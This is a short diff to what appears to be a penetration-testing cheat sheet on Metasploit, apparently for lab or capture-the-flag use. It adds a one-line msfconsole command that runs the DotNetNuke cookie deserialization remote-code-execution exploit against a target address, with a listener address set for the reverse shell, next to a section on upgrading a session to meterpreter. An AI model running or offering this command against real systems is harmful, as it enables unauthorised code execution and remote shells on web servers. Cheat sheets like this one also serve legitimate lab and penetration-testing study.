@@ -2,6 +2,11 @@
 
 % metasploit
 
+## oneliner
+```bash
+msfconsole -q -x 'setg LHOST=tun0;use windows/http/dnn_cookie_deserialization_rce;set LHOST 10.10.16.179; set RHOSTS 10.10.110.10; set RPORT 80;run'
+```
+
 ## upgrade session to meterpreter
 #plateform/linux #target/remote #cat/ATTACK/CONNECT  
 ```
